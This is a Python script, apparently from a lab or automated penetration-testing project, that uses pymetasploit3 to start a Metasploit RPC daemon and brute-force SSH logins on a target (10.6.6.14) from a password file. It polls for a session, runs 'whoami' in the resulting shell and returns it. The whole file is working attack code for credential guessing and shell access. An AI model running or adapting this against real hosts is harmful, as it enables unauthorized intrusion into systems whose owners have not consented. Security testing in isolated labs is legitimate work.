from pymetasploit3.msfrpc import MsfRpcClient
import time
import os
import pyfiglet


def exploit_ssh_brute(
    ip="10.6.6.14",
    path_to_userpass="./utilities/known_pass.txt",
    return_shell=True,
    verbose=True,
    banner=True,
):
    if banner:
        banner = pyfiglet.figlet_format("SSH Brute Force")
        print(banner)
        print("==" * 40)

    # Kill running msfrpcd
    os.system("pkill -f msfrpcd")
    time.sleep(0.5)

    # start a msfrpcd
    os.system("msfrpcd -a 127.0.0.1 -S False -p 1597 -P yourpassword")
    time.sleep(10.0)

    # Connect to the RPC server
    client = MsfRpcClient("yourpassword", port=1597, ssl=False)
    time.sleep(2.0)

    # Get an auxiliary object
    auxiliary = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
    time.sleep(0.5)

    # Set the exploit options
    auxiliary["RHOSTS"] = ip
    auxiliary["USERPASS_FILE"] = path_to_userpass

    # Execute the exploit, success will return a jobid
    auxiliary.execute(payload="cmd/unix/interact")
    time.sleep(5.0)
    # Sleep is so important, to make sure that,
    # exploit can actually finished before next line of code excutes

    # Find all available sessions
    starttime = time.time()
    while True:
        print("check if a session is found every 20 seconds")
        # print(client.sessions.list.keys())
        # auxiliary["ShowProgressPercent"]
        if len(client.sessions.list.keys()) != 0:
            print("Sessions avaiables : ")
            for s in client.sessions.list.keys():
                print(s)
        if len(client.sessions.list.keys()) >= 1:
            break
        time.sleep(20.0 - ((time.time() - starttime) % 20.0))

    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    time.sleep(5)
    # Write to the shell
    shell.write("whoami")
    # Print the output
    if verbose:
        print(shell.read())
    time.sleep(5)
    # Stop the shell
    result = shell.stop()
    if verbose:
        print(result["result"])
    if result["result"] == "success" and return_shell:
        return shell
    else:
        shell.close()
        os.system("pkill -f msfrpcd")
        return
